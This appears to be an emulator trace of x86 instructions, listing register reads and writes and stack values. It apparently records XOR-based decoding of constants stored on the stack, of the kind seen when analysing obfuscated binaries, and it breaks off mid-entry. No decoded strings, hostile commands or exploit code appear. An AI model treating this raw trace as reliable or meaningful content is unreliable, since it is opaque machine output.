[30, 22] 0x460f0e: pop edi, regs_read: [30], regs_write: [30, 23] 0x460f11: pop esi, regs_read: [30], regs_write: [30, 29] 0x460f12: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x130 and offset 0x8000 for stack size 0x10000 0x460f14: pop ebp, regs_read: [30], regs_write: [30, 20] 0x460f16: push ebp, regs_read: [30, 20], regs_write: [30] 0x460f17: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x460f22: push esi, regs_read: [30, 29], regs_write: [30] 0x460f23: push edi, regs_read: [30, 23], regs_write: [30] 0x460f24: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x460f29: mov dword ptr [esp + 0x10], 0x5f5e1d9, regs_read: [30], regs_write: () adjusting stack for ESP -0x8 and offset 0x8010 for stack size 0x10000 saving data to stack: 100000217 4 0x460f31: mov edi, 0x3769ce54, regs_read: (), regs_write: [23] 0x460f36: mov dword ptr [esp + 0x1c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x801c for stack size 0x10000 saving data to stack: 1389027477 4 0x460f3d: mov dword ptr [esp + 0x2c], 0x59052ac6, regs_read: [30], regs_write: () adjusting stack for ESP -0x8 and offset 0x802c for stack size 0x10000 saving data to stack: 1493510854 4 0x460f45: mov dword ptr [esp + 0x30], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x8 and offset 0x8030 for stack size 0x10000 saving data to stack: 929680980 4 0x460f49: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0x8 and offset 0x8000 for stack size 0x10000 0x460f4b: movaps xmm1, xmmword ptr [esp + 0x28], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x8028 for stack size 0x10000 0x460f50: mov dword ptr [esp + 0x54], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x8054 for stack size 0x10000 saving data to stack: 1389027477 4 0x460f58: mov dword ptr [esp + 0x48], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x8 and offset 0x8048 for stack size 0x10000 saving data to stack: 914789047 4 0x460f60: mov dword ptr [esp + 0x4c], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x8 and offset 0x804c for stack size 0x10000 saving data to stack: 896093928 4 0x460f68: mov dword ptr [esp + 0x50], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x8 and offset 0x8050 for stack size 0x10000 saving data to stack: 929680980 4 0x460f6c: pxor xmm1, xmmword ptr [esp + 0x48], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x8 and offset 0x8048 for stack size 0x10000 0x460f72: push eax, regs_read: [30, 19], regs_write: [30] 0x460f73: movaps xmmword ptr [esp + 0x2c], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x802c for stack size 0x10000 saving data to stack: 110050094684534569366449334426172087523 16 0x460f8d: mov eax, dword ptr [0x4f07f8], regs_read: (), regs_write: [19] 0x460f94: mov esi, dword ptr [0x4f07f4], regs_read: (), regs_write: [29] 0x460f9d: mov dword ptr [esp + 0xc], 0x30, regs_read: [30], regs_write: () adjusting stack for ESP -0xc and offset 0x800c for stack size 0x10000 saving data to stack: 48 4 0x460fa9: mov dword ptr [esp + 0x2c], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x802c for stack size 0x10000 saving data to stack: 0 4 0x460fb5: mov edx, 0x368692b7, regs_read: (), regs_write: [24] 0x460fba: mov dword ptr [esp + 0x88], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x8088 for stack size 0x10000 saving data to stack: 929680980 4 0x460fc1: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x460fc6: mov dword ptr [esp + 0x98], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x8098 for stack size 0x10000 saving data to stack: 929680980 4 0x460fcd: mov dword ptr [esp + 0xc8], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x80c8 for stack size 0x10000 saving data to stack: 929680980 4 0x460fd4: mov dword ptr [esp + 0xa8], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x80a8 for stack size 0x10000 saving data to stack: 929680980 4 0x460fdb: mov dword ptr [esp + 0xb8], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x80b8 for stack size 0x10000 saving data to stack: 929680980 4 0x460fe2: mov edi, ecx, regs_read: [22], regs_write: [23] 0x460fe4: mov dword ptr [esp + 0x80], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xc and offset 0x8080 for stack size 0x10000 saving data to stack: 914789047 4 0x460feb: mov dword ptr [esp + 0x84], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0xc and offset 0x8084 for stack size 0x10000 saving data to stack: 896093928 4 0x460ff6: mov dword ptr [esp + 0x8c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x808c for stack size 0x10000 saving data to stack: 1389027477 4 0x460ffd: mov dword ptr [esp + 0x90], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xc and offset 0x8090 for stack size 0x10000 saving data to stack: 914789047 4 0x461004: mov dword ptr [esp + 0x94], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0xc and offset 0x8094 for stack size 0x10000 saving data to stack: 896093928 4 0x46100f: mov dword ptr [esp + 0x9c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x809c for stack size 0x10000 saving data to stack: 1389027477 4 0x461016: mov dword ptr [esp + 0xc0], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xc and offset 0x80c0 for stack size 0x10000 saving data to stack: 914789047 4 0x46101d: mov dword ptr [esp + 0xc4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0xc and offset 0x80c4 for stack size 0x10000 saving data to stack: 896093928 4 0x461028: mov dword ptr [esp + 0xcc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x80cc for stack size 0x10000 saving data to stack: 1389027477 4 0x46102f: mov dword ptr [esp + 0xd0], 0x7208cb09, regs_read: [30], regs_write: () adjusting stack for ESP -0xc and offset 0x80d0 for stack size 0x10000 saving data to stack: 1913178889 4 0x46103a: mov dword ptr [esp + 0xd4], 0x84ff9d1e, regs_read: [30], regs_write: () adjusting stack for ESP -0xc and offset 0x80d4 for stack size 0x10000 saving data to stack: 2231344414 4 0x461045: mov dword ptr [esp + 0xd8], 0x22f82a66, regs_read: [30], regs_write: () adjusting stack for ESP -0xc and offset 0x80d8 for stack size 0x10000 saving data to stack: 586689126 4 0x461050: mov dword ptr [esp + 0xdc], 0x656c28fb, regs_read: [30], regs_write: () adjusting stack for ESP -0xc and offset 0x80dc for stack size 0x10000 saving data to stack: 1701587195 4 0x46105b: mov dword ptr [esp + 0xa0], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xc and offset 0x80a0 for stack size 0x10000 saving data to stack: 914789047 4 0x461062: mov dword ptr [esp + 0xa4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0xc and offset 0x80a4 for stack size 0x10000 saving data to stack: 896093928 4 0x46106d: mov dword ptr [esp + 0xac], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x80ac for stack size 0x10000 saving data to stack: 1389027477 4 0x461074: mov dword ptr [esp + 0xb0], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xc and offset 0x80b0 for stack size 0x10000 saving data to stack: 914789047 4 0x46107b: mov dword ptr [esp + 0xb4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0xc and offset 0x80b4 for stack size 0x10000 saving data to stack: 896093928 4 0x461086: mov dword ptr [esp + 0xbc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x80bc for stack size 0x10000 saving data to stack: 1389027477 4 0x46108d: mov dword ptr [esp + 8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x8008 for stack size 0x10000 saving data to stack: 0 4 0x461097: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x461099: push eax, regs_read: [30, 19], regs_write: [30] 0x4610ab: mov edi, dword ptr [0x4f07f4], regs_read: (), regs_write: [23] 0x4610b8: mov dword ptr [esp + 0x20], 0x5fe1fddb, regs_read: [30], regs_write: () adjusting stack for ESP -0x10 and offset 0x8020 for stack size 0x10000 saving data to stack: 1608646107 4 0x4610c0: mov dword ptr [esp + 0x24], 0x35693d86, regs_read: [30], regs_write: () adjusting stack for ESP -0x10 and offset 0x8024 for stack size 0x10000 saving data to stack: 896089478 4 0x4610c8: mov esi, esp, regs_read: [30], regs_write: [29] adjusting stack for ESP -0x10 and offset 0x8000 for stack size 0x10000 0x4610ca: mov dword ptr [esp + 0x28], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x10 and offset 0x8028 for stack size 0x10000 saving data to stack: 929680980 4 0x4610d2: mov dword ptr [esp + 0x2c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP -0x10 and offset 0x802c for stack size 0x10000 saving data to stack: 1389027477 4 0x4610da: movaps xmm0, xmmword ptr [esp + 0x20], regs_read: [30], regs_write: [122] adjusting stack for ESP -0x10 and offset 0x8020 for stack size 0x10000 0x4610df: pxor xmm0, xmmword ptr [esp + 0x90], regs_read: [122, 30], regs_write: [122] adjusting stack for ESP -0x10 and offset 0x8090 for stack size 0x10000 0x4610e8: push ecx, regs_read: [30, 22], regs_write: [30] 0x4610e9: mov ecx, eax, regs_read: [19], regs_write: [22] 0x4610eb: movaps xmmword ptr [esp + 0x24], xmm0, regs_read: [30, 122], regs_write: () adjusting stack for ESP -0x14 and offset 0x8024 for stack size 0x10000 saving data to stack: 135099320244714391247415662353708686670 16 0x4610f5: push eax, regs_read: [30, 19], regs_write: [30] 0x4610f6: mov ecx, esi, regs_read: [29], regs_write: [22] 0x461100: mov ecx, 0x4f0720, regs_read: (), regs_write: [22] 0x461109: push eax, regs_read: [30, 19], regs_write: [30] 0x46110f: mov ecx, eax, regs_read: [19], regs_write: [22] 0x461116: push dword ptr [esp + 0xe0], regs_read: [30], regs_write: [30] 0x461129: mov eax, dword ptr [0x4f07f4], regs_read: (), regs_write: [19] 0x461135: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0x20 and offset 0x8000 for stack size 0x10000 0x461137: push eax, regs_read: [30, 19], regs_write: [30] 0x461149: mov edi, dword ptr [0x4f07f4], regs_read: (), regs_write: [23] 0x461156: mov dword ptr [esp + 0x50], 0x59f2e7d6, regs_read: [30], regs_write: () adjusting stack for ESP -0x24 and offset 0x8050 for stack size 0x10000 saving data to stack: 1509091286 4 0x46115e: mov dword ptr [esp + 0x54], 0x5905278e, regs_read: [30], regs_write: () adjusting stack for ESP -0x24 and offset 0x8054 for stack size 0x10000 saving data to stack: 1493510030 4 0x461166: mov esi, esp, regs_read: [30], regs_write: [29] adjusting stack for ESP -0x24 and offset 0x8000 for stack size 0x10000 0x461168: mov dword ptr [esp + 0x58], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x24 and offset 0x8058 for stack size 0x10000 saving data to stack: 929680980 4 0x461170: mov dword ptr [esp + 0x5c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP -0x24 and offset 0x805c for stack size 0x10000 saving data to stack: 1389027477 4 0x461178: movaps xmm0, xmmword ptr [esp + 0x50], regs_read: [30], regs_write: [122] adjusting stack for ESP -0x24 and offset 0x8050 for stack size 0x10000 0x46117d: pxor xmm0, xmmword ptr [esp + 0xa0], regs_read: [122, 30], regs_write: [122] adjusting stack for ESP -0x24 and offset 0x80a0 for stack size 0x10000 0x461186: push ecx, regs_read: [30, 22], regs_write: [30] 0x461187: mov ecx, eax, regs_read: [19], regs_write: [22] 0x461189: movaps xmmword ptr [esp + 0x54], xmm0, regs_read: [30, 122], regs_write: () adjusting stack for ESP -0x28 and offset 0x8054 for stack size 0x10000 saving data to stack: 137760366997177718412926252081393379714 16 0x461193: push eax, regs_read: [30, 19], regs_write: [30] 0x461194: mov ecx, esi, regs_read: [29], regs_write: [22] 0x46119b: mov esi, dword ptr [esp + 0x18], regs_read: [30], regs_write: [29] adjusting stack for ESP -0x2c and offset 0x8018 for stack size 0x10000 0x46119f: mov ecx, 0x4f0820, regs_read: (), regs_write: [22] 0x4611a9: push eax, regs_read: [30, 19], regs_write: [30] 0x4611af: mov ecx, eax, regs_read: [19], regs_write: [22] 0x4611b6: push dword ptr [esp + 0xf0], regs_read: [30], regs_write: [30] 0x4611c9: mov eax, dword ptr [0x4f07f4], regs_read: (), regs_write: [19] 0x4611d3: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0x34 and offset 0x8000 for stack size 0x10000 0x4611d5: push eax, regs_read: [30, 19], regs_write: [30] 0x4611e7: mov dword ptr [esp + 0x78], 0x58f1fdd3, regs_read: [30], regs_write: () adjusting stack for ESP -0x38 and offset 0x8078 for stack size 0x10000 saving data to stack: 1492254163 4 0x4611ef: mov dword ptr [esp + 0x7c], 0x51082184, regs_read: [30], regs_write: () adjusting stack for ESP -0x38 and offset 0x807c for stack size 0x10000 saving data to stack: 1359487364 4 0x4611f7: mov dword ptr [esp + 0x80], 0x4400a60b, regs_read: [30], regs_write: () adjusting stack for ESP -0x38 and offset 0x8080 for stack size 0x10000 saving data to stack: 1140893195 4 0x461202: mov edi, dword ptr [0x4f07f4], regs_read: (), regs_write: [23] 0x46120c: mov dword ptr [esp + 0x84], 0x2bb88fe1, regs_read: [30], regs_write: () adjusting stack for ESP -0x38 and offset 0x8084 for stack size 0x10000 saving data to stack: 733515745 4 0x46121a: movaps xmm0, xmmword ptr [esp + 0x70], regs_read: [30], regs_write: [122] adjusting stack for ESP -0x38 and offset 0x8070 for stack size 0x10000 0x46121f: mov esi, esp, regs_read: [30], regs_write: [29] adjusting stack for ESP -0x38 and offset 0x8000 for stack size 0x10000 0x461221: pxor xmm0, xmmword ptr [esp + 0xd0], regs_read: [122, 30], regs_write: [122] adjusting stack for ESP -0x38 and offset 0x80d0 for stack size 0x10000 0x46122a: mov dword ptr [esp + 0x80], 0x7208cb09, regs_read: [30], regs_write: () adjusting stack for ESP -0x38 and offset 0x8080 for stack size 0x10000 saving data to stack: 1913178889 4 0x461235: mov dword ptr [esp + 0x84], 0x84ff9d1e, regs_read: [30], regs_write: () adjusting stack for ESP -0x38 and offset 0x8084 for stack size 0x10000 saving data to stack: 2231344414 4 0x461240: mov dword ptr [esp + 0x88], 0x22f82a66, regs_read: [30], regs_write: () adjusting stack for ESP -0x38 and offset 0x8088 for stack size 0x10000 saving data to stack: 586689126 4 0x46124b: mov dword ptr [esp + 0x8c], 0x656c28fb, regs_read: [30], regs_write: () adjusting stack for ESP -0x38 and offset 0x808c for stack size 0x10000 saving data to stack: 1701587195 4 0x461256: movaps xmmword ptr [esp + 0x70], xmm0, regs_read: [30, 122], regs_write: () adjusting stack for ESP -0x38 and offset 0x8070 for stack size 0x10000 saving data to stack: 137651424314879937277683590100041785493 16 0x46125b: movaps xmm0, xmmword ptr [esp + 0x80], regs_read: [30], regs_write: [122] adjusting stack for ESP -0x38 and offset 0x8080 for stack size 0x10000 0x461263: pxor xmm0, xmmword ptr [esp + 0xe0], regs_read: [122, 30], regs_write: [122] adjusting stack for ESP -0x38 and offset 0x80e0 for stack size 0x10000 0x46126c: push ecx, regs_read: [30, 22], regs_write: [30] 0x46126d: mov ecx, eax, regs_read: [19], regs_write: [22] 0x46126f: movaps xmmword ptr [esp + 0x84], xmm0, regs_read: [30, 122], regs_write: () adjusting stack for ESP -0x3c and offset 0x8084 for stack size 0x10000 saving data to stack: 111544699699295523215380984335836480993 16 0x46127c: push eax, regs_read: [30, 19], regs_write: [30] 0x46127d: mov ecx, esi, regs_read: [29], regs_write: [22] 0x461287: mov ecx, 0x4f0810, regs_read: (), regs_write: [22] 0x461290: push eax, regs_read: [30, 19], regs_write: [30] 0x461296: mov ecx, eax, regs_read: [19], regs_write: [22] 0x46129d: push dword ptr [esp + 0x100], regs_read: [30], regs_write: [30] 0x4612b0: mov eax, dword ptr [0x4f07f4], regs_read: (), regs_write: [19] 0x4612bc: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0x48 and offset 0x8000 for stack size 0x10000 0x4612be: push eax, regs_read: [30, 19], regs_write: [30] 0x4612d0: mov edi, dword ptr [0x4f07f4], regs_read: (), regs_write: [23] 0x4612dd: mov dword ptr [esp + 0x60], 0x5de9fdd4, regs_read: [30], regs_write: () adjusting stack for ESP -0x4c and offset 0x8060 for stack size 0x10000 saving data to stack: 1575615956 4 0x4612e5: mov dword ptr [esp + 0x64], 0x351a2b81, regs_read: [30], regs_write: () adjusting stack for ESP -0x4c and offset 0x8064 for stack size 0x10000 saving data to stack: 890907521 4 0x4612ed: mov esi, esp, regs_read: [30], regs_write: [29] adjusting stack for ESP -0x4c and offset 0x8000 for stack size 0x10000 0x4612ef: mov dword ptr [esp + 0x68], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x4c and offset 0x8068 for stack size 0x10000 saving data to stack: 929680980 4 0x4612f7: mov dword ptr [esp + 0x6c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP -0x4c and offset 0x806c for stack size 0x10000 saving data to stack: 1389027477 4 0x4612ff: movaps xmm0, xmmword ptr [esp + 0x60], regs_read: [30], regs_write: [122] adjusting stack for ESP -0x4c and offset 0x8060 for stack size 0x10000 0x461304: pxor xmm0, xmmword ptr [esp + 0xb0], regs_read: [122, 30], regs_write: [122] adjusting stack for ESP -0x4c and offset 0x80b0 for stack size 0x10000 0x46130d: push ecx, regs_read: [30, 22], regs_write: [30] 0x46130e: mov ecx, eax, regs_read: [19], regs_write: [22] 0x461310: movaps xmmword ptr [esp + 0x64], xmm0, regs_read: [30, 122], regs_write: () adjusting stack for ESP -0x50 and offset 0x8064 for stack size 0x10000 saving data to stack: 107860812612522714866151647990713548244 16 0x46131a: push eax, regs_read: [30, 19], regs_write: [30] 0x46131b: mov ecx, esi, regs_read: [29], regs_write: [22] 0x461325: mov ecx, 0x4f0730, regs_read: (), regs_write: [22] 0x46132e: push eax, regs_read: [30, 19], regs_write: [30] 0x461334: mov ecx, eax, regs_read: [19], regs_write: [22] 0x46133b: push dword ptr [esp + 0x110], regs_read: [30], regs_write: [30] 0x46134e: mov eax, dword ptr [0x4f07f4], regs_read: (), regs_write: [19] 0x46135a: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0x5c and offset 0x8000 for stack size 0x10000 0x46135c: push eax, regs_read: [30, 19], regs_write: [30] 0x46136e: mov dword ptr [esp + 0x48], 0x42f5fbdf, regs_read: [30], regs_write: () adjusting stack for ESP -0x60 and offset 0x8048 for stack size 0x10000 saving data to stack: 1123417055 4 0x461376: mov dword ptr [esp + 0x4c], 0x35103c87, regs_read: [30], regs_write: () adjusting stack for ESP -0x60 and offset 0x804c for stack size 0x10000 saving data to stack: 890256519 4 0x46137e: mov dword ptr [esp + 0x50], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x60 and offset 0x8050 for stack size 0x10000 saving data to stack: 929680980 4 0x461386: mov dword ptr [esp + 0x54], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP -0x60 and offset 0x8054 for stack size 0x10000 saving data to stack: 1389027477 4 0x46138e: movaps xmm0, xmmword ptr [esp + 0x48], regs_read: [30], regs_write: [122] adjusting stack for ESP -0x60 and offset 0x8048 for stack size 0x10000 0x461393: pxor xmm0, xmmword ptr [esp + 0xc8], regs_read: [122, 30], regs_write: [122] adjusting stack for ESP -0x60 and offset 0x80c8 for stack size 0x10000 0x46139c: movaps xmmword ptr [esp + 0x48], xmm0, regs_read: [30, 122], regs_write: () adjusting stack for ESP -0x60 and offset 0x8048 for stack size 0x10000 saving data to stack: 133319729044447879409136000674736114504 16 0x4613a1: mov edi, dword ptr [0x4f07f4], regs_read: (), regs_write: [23] 0x4613ae: mov esi, esp, regs_read: [30], regs_write: [29] adjusting stack for ESP -0x60 and offset 0x8000 for stack size 0x10000 0x4613b0: push ecx, regs_read: [30, 22], regs_write: [30] 0x4613b1: mov ecx, eax, regs_read: [19], regs_write: [22] 0x4613b8: push eax, regs_read: [30, 19], regs_write: [30] 0x4613b9: mov ecx, esi, regs_read: [29], regs_write: [22] 0x4613c0: mov eax, dword ptr [esp + 0x18], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x68 and offset 0x8018 for stack size 0x10000 0x4613c9: mov ecx, 0x4f0778, regs_read: (), regs_write: [22] 0x4613ce: push eax, regs_read: [30, 19], regs_write: [30] 0x4613d4: mov ecx, eax, regs_read: [19], regs_write: [22] 0x4613db: push dword ptr [esp + 0x120], regs_read: [30], regs_write: [30] 0x4613ee: mov eax, dword ptr [0x4f07f8], regs_read: (), regs_write: [19] 0x4613f3: mov esi, dword ptr [0x4f07f4], regs_read: (), regs_write: [29] 0x461400: mov ecx, dword ptr [esp + 0x2c], regs_read: [30], regs_write: [22] adjusting stack for ESP -0x70 and offset 0x802c for stack size 0x10000 0x461404: mov edi, dword ptr [esp + 8], regs_read: [30], regs_write: [23] adjusting stack for ESP -0x70 and offset 0x8008 for stack size 0x10000 0x46140d: mov dword ptr [esp + 0x2c], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x70 and offset 0x802c for stack size 0x10000 saving data to stack: 4210421911 4 0x461411: mov dword ptr [esp + 8], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x70 and offset 0x8008 for stack size 0x10000 saving data to stack: 586689126 4 0x46141d: pop edi, regs_read: [30], regs_write: [30, 23] 0x461420: pop esi, regs_read: [30], regs_write: [30, 29] 0x461421: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x68 and offset 0x8000 for stack size 0x10000 0x461423: pop ebp, regs_read: [30], regs_write: [30, 20] 0x461425: push ebp, regs_read: [30, 20], regs_write: [30] 0x461426: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x22f82a66 and offset 0x8000 for stack size 0x10000 0x46142b: mov eax, 0x22f8, regs_read: (), regs_write: [19] 0x461435: mov eax, dword ptr [0x4f0698], regs_read: (), regs_write: [19] 0x46143a: push esi, regs_read: [30, 29], regs_write: [30] 0x46143b: mov esi, dword ptr [0x4f0694], regs_read: (), regs_write: [29] 0x461443: push edi, regs_read: [30, 23], regs_write: [30] 0x461444: push 0x34, regs_read: [30], regs_write: [30] 0x461449: pop ecx, regs_read: [30], regs_write: [30, 22] 0x461454: mov edx, 0x35694ee8, regs_read: (), regs_write: [24] 0x461459: mov dword ptr [esp + 0x1190], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9190 for stack size 0x10000 saving data to stack: 914789047 4 0x461464: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x461469: mov dword ptr [esp + 0x1194], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9194 for stack size 0x10004 saving data to stack: 896093928 4 0x461470: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x461475: mov dword ptr [esp + 0x1198], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9198 for stack size 0x10008 saving data to stack: 929680980 4 0x46147c: mov dword ptr [esp + 0x119c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x919c for stack size 0x1000c saving data to stack: 1389027477 4 0x461483: mov dword ptr [esp + 0x11a4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x91a4 for stack size 0x10010 saving data to stack: 896093928 4 0x46148a: mov dword ptr [esp + 0x11a8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x91a8 for stack size 0x10014 saving data to stack: 929680980 4 0x461491: mov dword ptr [esp + 0x11ac], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x91ac for stack size 0x10018 saving data to stack: 1389027477 4 0x461498: mov dword ptr [esp + 0x1524], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9524 for stack size 0x1001c saving data to stack: 896093928 4 0x46149f: mov edx, 0x84ff9d1e, regs_read: (), regs_write: [24] 0x4614a4: mov dword ptr [esp + 0x1528], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9528 for stack size 0x10020 saving data to stack: 929680980 4 0x4614ab: mov ecx, 0x22f82a66, regs_read: (), regs_write: [22] 0x4614b0: mov dword ptr [esp + 0x152c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x952c for stack size 0x10024 saving data to stack: 1389027477 4 0x4614b7: mov eax, 0x656c28fb, regs_read: (), regs_write: [19] 0x4614bc: mov dword ptr [esp + 0x11a0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x91a0 for stack size 0x10028 saving data to stack: 914789047 4 0x4614c7: mov dword ptr [esp + 0x1520], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9520 for stack size 0x1002c saving data to stack: 914789047 4 0x4614d2: mov dword ptr [esp + 0x1530], 0x7208cb09, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9530 for stack size 0x10030 saving data to stack: 1913178889 4 0x4614dd: mov dword ptr [esp + 0x1534], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9534 for stack size 0x10034 saving data to stack: 2231344414 4 0x4614e4: mov dword ptr [esp + 0x1538], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x9538 for stack size 0x10038 saving data to stack: 586689126 4 0x4614eb: mov dword ptr [esp + 0x153c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x953c for stack size 0x1003c saving data to stack: 1701587195 4 0x4614f2: mov dword ptr [esp + 0x11b0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x91b0 for stack size 0x10040 saving data to stack: 914789047 4 0x4614fd: mov dword ptr [esp + 0x11b4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x91b4 for stack size 0x10044 saving data to stack: 896093928 4 0x461508: mov dword ptr [esp + 0x11b8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x91b8 for stack size 0x10048 saving data to stack: 929680980 4 0x461513: mov dword ptr [esp + 0x11bc], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x91bc for stack size 0x1004c saving data to stack: 1389027477 4 0x46151e: mov dword ptr [esp + 0x11c0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x91c0 for stack size 0x10050 saving data to stack: 914789047 4 0x461529: mov dword ptr [esp + 0x11c4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x91c4 for stack size 0x10054 saving data to stack: 896093928 4 0x461534: mov dword ptr [esp + 0x11c8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x91c8 for stack size 0x10058 saving data to stack: 929680980 4 0x46153f: mov dword ptr [esp + 0x11cc], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x91cc for stack size 0x1005c saving data to stack: 1389027477 4 0x46154a: mov dword ptr [esp + 0x11d0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x91d0 for stack size 0x10060 saving data to stack: 914789047 4 0x461555: mov dword ptr [esp + 0x11d4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x91d4 for stack size 0x10064 saving data to stack: 896093928 4 0x461560: mov dword ptr [esp + 0x11d8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x91d8 for stack size 0x10068 saving data to stack: 929680980 4 0x46156b: mov dword ptr [esp + 0x11dc], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x91dc for stack size 0x1006c saving data to stack: 1389027477 4 0x461576: mov dword ptr [esp + 0x11e0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x91e0 for stack size 0x10070 saving data to stack: 914789047 4 0x461581: mov dword ptr [esp + 0x11e4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x91e4 for stack size 0x10074 saving data to stack: 896093928 4 0x46158c: mov dword ptr [esp + 0x11e8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x91e8 for stack size 0x10078 saving data to stack: 929680980 4 0x461597: mov dword ptr [esp + 0x11ec], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x91ec for stack size 0x1007c saving data to stack: 1389027477 4 0x4615a2: mov dword ptr [esp + 0x11f0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x22f82a5e and offset 0x91f0 for stack size 0x10080 saving data to stack: 914789047 4 0x4615ad: mov dword ptr [esp + 